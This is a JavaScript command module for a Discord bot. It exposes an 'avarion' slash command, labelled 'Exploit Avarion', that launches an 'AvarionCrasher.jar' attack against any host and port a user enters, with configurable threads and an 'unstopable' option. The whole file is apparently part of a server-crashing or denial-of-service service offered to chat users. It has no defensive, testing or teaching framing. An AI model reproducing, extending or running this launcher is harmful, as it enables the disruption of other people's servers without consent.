/** format */

const Command = require('../structure/command.js');
const Attack = require('../structure/attack.js');
const crashers = require('../functions/crashers.js');
const config = require('../jsons/config.json');
const Discord = require('discord.js');

module.exports = new Command({
    name: "avarion",
    description: "Exploit Avarion",
    permissions: "SEND_MESSAGES",
    disableOnAttack: true,
    slashCommandOptions: [{
        name: "host",
        type: Discord.ApplicationCommandOptionType.String,
        description: "Enter host or ip server",
        required: true
    }, {
        name: "port",
        description: "Enter port server",
        type: Discord.ApplicationCommandOptionType.Number,
        maxValue: 65536,
        minValue: 1,
        required: false
    }, {
        name: "threads",
        description: "Count threads",
        type: Discord.ApplicationCommandOptionType.Number,
        maxValue: config.maxThreads.avarion,
        minValue: 1,
        required: false
    }, {
        name: "unstopable",
        description: "Unstopable testing",
        type: Discord.ApplicationCommandOptionType.Boolean,
        required: false
    }],
    async execute(client, args, interaction){
        let host = args.getString("host");
        let port = args.getNumber("port") || 0;
        let threads = args.getNumber("threads") || config.maxThreads.avarion - client.activeThreads.avarion;
        const unstop = args.getBoolean("unstopable") || false;

        await interaction.deferReply({fetchReply: true}).then((msg) => {
            const attack = new Attack({
                jaroptions: {
                    jarname: "AvarionCrasher.jar",
                    jarargs: `host-%HOST% port-%PORT% threads-%THREADS%`
                },
                client: client,
                interaction: interaction,
                msgID: msg.id,
                AttacksArray: client.attacks,
                method: {
                    text: "AvarionCrasher 💥",
                    name: "avarion"
                },
                threads: {
                    count: threads,
                    activeThreads: client.activeThreads.avarion,
                    maxThreads: config.maxThreads.avarion
                },
                host: host,
                port: port,
                unstopable: unstop,
                ownerID: interaction.user.id
            })
    
            client.attacks.set(msg.id, attack);
        })
    }
});